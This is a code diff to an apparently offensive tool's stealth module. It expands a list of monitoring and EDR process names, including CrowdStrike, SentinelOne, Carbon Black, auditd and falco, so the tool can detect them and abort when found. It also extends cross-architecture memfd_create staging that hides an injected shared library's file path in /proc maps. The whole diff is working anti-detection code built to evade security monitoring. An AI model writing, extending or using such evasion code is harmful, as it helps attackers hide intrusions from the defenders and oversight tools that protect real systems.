@@ -6,6 +6,7 @@ memfd library staging, seccomp/MAC checks, and secure file deletion.
 """
 
 import os
+import platform
 import time
 import random
 import secrets
@@ -51,38 +52,72 @@ def restore_process_comm(original: str) -> None:
 
 # ── Monitor / EDR detection ───────────────────────────────────────────────────
 
+# Checked against both /proc/<pid>/comm (truncated to 15 chars by the kernel)
+# and the basename of /proc/<pid>/exe (full binary name, not truncated).
+# comm is what ps/top show; exe covers cases where the agent renamed itself.
+_MONITOR_COMM: frozenset = frozenset({
+    # Classic Linux tracers
+    "strace", "ltrace", "perf", "bpftrace",
+    # System audit / intrusion detection
+    "auditd", "sysdig", "falco", "osqueryd",
+    # eBPF-based security
+    "tetragon", "tracee", "cilium-agent",
+    # EDR agents — comm values as they actually appear in /proc
+    "cbdaemon",           # Carbon Black (older sensor)
+    "cbsensor",           # Carbon Black (newer)
+    "ds_agent",           # Trend Micro Deep Security
+    "xagt",               # FireEye/Trellix Endpoint Agent
+    "falcon-sensor",      # CrowdStrike Falcon (real comm, not "CrowdStrike")
+    "falcond",            # CrowdStrike Falcon (some versions)
+    "SentinelAgent",      # SentinelOne
+    "sentineld",          # SentinelOne (some distros)
+    "cortex-xdr",         # Palo Alto Cortex XDR
+    "sysmon",             # Sysinternals Sysmon for Linux
+})
+
+# exe basenames that differ from comm (binary name longer than 15 chars,
+# or just a different filename from what shows up in comm).
+_MONITOR_EXE: frozenset = frozenset({
+    "falcon-sensor",
+    "falcon-sensor-b",    # bpf variant
+    "SentinelAgent",
+    "SentinelOne",
+    "cortex-xdr",
+    "sysmon",
+})
+
+
 def check_monitors(abort_on_found: bool = False) -> List[str]:
     """
     Scan /proc for known monitoring, tracing, and EDR daemons.
 
+    Checks both /proc/<pid>/comm and the basename of /proc/<pid>/exe so
+    agents with names longer than 15 chars are caught regardless of
+    kernel comm truncation.
+
     If abort_on_found=True the function calls die() immediately.
     Otherwise returns a list so the caller can decide.
     """
-    # Heuristic list of common tracers/EDR agents; not exhaustive and names
-    # may vary between distributions and vendors.
-    suspects = {
-        # Classic Linux tracers
-        "strace", "ltrace", "perf", "bpftrace",
-        # System audit / intrusion detection
-        "auditd", "sysdig", "falco", "osqueryd",
-        # eBPF-based security
-        "tetragon", "tracee", "cilium-agent",
-        # EDR agents (common in enterprise)
-        "cbdaemon", "cbsensor",    # Carbon Black
-        "ds_agent",                # Trend Micro
-        "xagt",                    # FireEye
-        "CrowdStrike",             # CrowdStrike
-    }
     found = []
     try:
         for entry in Path("/proc").iterdir():
             if not entry.name.isdigit():
                 continue
             try:
-                name = (entry / "comm").read_text().strip()
-                if name in suspects:
-                    found.append(name)
-            except (PermissionError, FileNotFoundError, ProcessLookupError):
+                comm = (entry / "comm").read_text().strip()
+                if comm in _MONITOR_COMM:
+                    if comm not in found:
+                        found.append(comm)
+                    continue
+
+                # Fall back to exe basename for processes whose real name
+                # is longer than the 15-char comm limit.
+                exe_path = (entry / "exe").resolve()
+                exe_name = exe_path.name
+                if exe_name in _MONITOR_EXE and exe_name not in found:
+                    found.append(exe_name)
+
+            except (PermissionError, FileNotFoundError, ProcessLookupError, OSError):
                 pass
     except (PermissionError, FileNotFoundError):
         pass
@@ -141,6 +176,16 @@ def check_selinux_apparmor(pid: int) -> Optional[str]:
 
 # ── memfd staging ─────────────────────────────────────────────────────────────
 
+# SYS_memfd_create syscall numbers by architecture.
+# Extend this dict when adding new arch support.
+_MEMFD_CREATE_NR: dict = {
+    "x86_64":  319,
+    "aarch64": 279,
+    "armv7l":  385,   # ARM EABI (32-bit)
+    "riscv64": 279,   # same as aarch64 in the generic syscall table
+}
+
+
 def memfd_stage(lib_path: Path) -> Tuple[str, int]:
     """
     Copy the .so into an anonymous memfd.
@@ -151,15 +196,20 @@ def memfd_stage(lib_path: Path) -> Tuple[str, int]:
     The library appears as 'memfd:<random>' in /proc/pid/maps instead
     of its real filesystem path.
     """
-    # x86_64-specific syscall number; other architectures may differ.
-    SYS_memfd_create = 319  # x86_64 (other architectures may differ)
+    arch = platform.machine()
+    syscall_nr = _MEMFD_CREATE_NR.get(arch)
+    if syscall_nr is None:
+        raise OSError(
+            f"memfd_create syscall number unknown for architecture '{arch}'.\n"
+            "      Add it to _MEMFD_CREATE_NR in core/stealth.py and submit a PR."
+        )
 
     libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
     libc.syscall.restype  = ctypes.c_long
     libc.syscall.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.c_uint]
 
     mem_name = secrets.token_hex(6).encode()
-    fd = libc.syscall(SYS_memfd_create, mem_name, ctypes.c_uint(0))
+    fd = libc.syscall(syscall_nr, mem_name, ctypes.c_uint(0))
     if fd < 0:
         raise OSError("memfd_create syscall failed (kernel < 3.17?)")
 
